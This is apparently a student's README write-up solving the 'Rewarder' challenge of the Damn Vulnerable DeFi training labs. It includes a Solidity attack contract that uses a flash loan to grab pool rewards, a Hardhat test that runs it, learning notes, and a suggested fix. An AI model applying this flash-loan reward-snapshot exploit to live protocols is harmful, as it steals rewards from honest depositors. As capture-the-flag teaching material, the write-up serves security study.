![](cover.png)

**A set of challenges to learn offensive security of smart contracts in Ethereum.**

Featuring flash loans, price oracles, governance, NFTs, lending pools, smart contract wallets, timelocks, and more!

## Play

Visit [damnvulnerabledefi.xyz](https://damnvulnerabledefi.xyz)

## Help

For Q&A and troubleshooting running Damn Vulnerable DeFi, go [here](https://github.com/tinchoabbate/damn-vulnerable-defi/discussions/categories/support-q-a-troubleshooting).

## Disclaimer

All Solidity code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.

DO NOT USE IN PRODUCTION.

## Comparison

command to run test -> npx hardhat test the_rewarder.challenge.js About to use github linker and "@audit" tag to document stuff in .md file as mentioned here

---- before executing the code ------

I was unable to write report, because I dont have any clue how to write a good report.

** DO NOT READ FURTHER BELOW IF YOU HAVE NOT ALREADY TRIED SOLVING ** - highly recommended.

## Solution :

https://github.com/JayeshShukla/damn-vulnerable-defi/blob/207d65b756fc8a011089b8a1e4d85bbfae58e84c/contracts/the-rewarder/FaultyContract.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFlashloanPool {
    function flashLoan(uint256 amount) external;
}

interface IRewardPool {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
}

contract FaultyContract {
    IFlashloanPool public immutable flashLoanPool;
    IERC20 public immutable liquidityToken;
    IRewardPool immutable rewarderPool;
    IERC20 immutable rewardPool;
    address immutable player;

    constructor(address _flashLoanPool, address _liquidityToken, address _rewarderPool, address _rewardPool) {
        flashLoanPool = IFlashloanPool(_flashLoanPool);
        liquidityToken = IERC20(_liquidityToken);
        rewarderPool = IRewardPool(_rewarderPool);
        rewardPool = IERC20(_rewardPool);
        player = msg.sender;
    }

    function firstTimer() external {
        flashLoanPool.flashLoan(uint256(liquidityToken.balanceOf(address(flashLoanPool))));
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewardPool.transfer(player, rewardPool.balanceOf(address(this)));
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanPool), amount);
    }
}

```

https://github.com/JayeshShukla/damn-vulnerable-defi/blob/207d65b756fc8a011089b8a1e4d85bbfae58e84c/test/the-rewarder/the-rewarder.challenge.js#L99-L112

```javascript
it("Execution", async function () {
  await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]);

  let playerContract = await (
    await ethers.getContractFactory("FaultyContract", player)
  ).deploy(
    flashLoanPool.address,
    liquidityToken.address,
    rewarderPool.address,
    rewardToken.address
  );

  await playerContract.firstTimer();
});
```

## Concepts Learned :

[here](https://www.linkedin.com/pulse/damn-vulnerable-defi-v3-challenge-5-solution-rewarder-johnny-time/)

when comparing my code with the above url these are all the findings :

```solidity
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFlashloanPool {
    function flashLoan(uint256 amount) external;
}

interface IRewardPool {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
}

```

1. declaring Interface is a way to tell solidity the next contract I am about has these particular functions. This is important because we need calldatat to talk to evm and calldata is nothing but info about the function to be called and its arge.

2. Interface acts as types for address to create an instance of the contract at the particular address;

3. Intrestingly all the functions in Interface needs to be external & even calls an internal function of the particular contract if that function is called by the function in your Interface.

4. I found that when compared to URL it is unncessary to provide the distributeRewards() in interface as our deposit() function calls distributeRewards(); -> its an additonal thing which will increase the gas for.

5. Understood some Intrsting concept about Safetransfer library.
POSITIVE TAKE AWAY : The logic I applied is exactly same as given in the URL above. Need to make my contract safe too which I did not do..

## Hack & How to stop it

Simply put the issue is the protocal is designed faulty and should have some lock time for the deposit amounts, which its lacking.
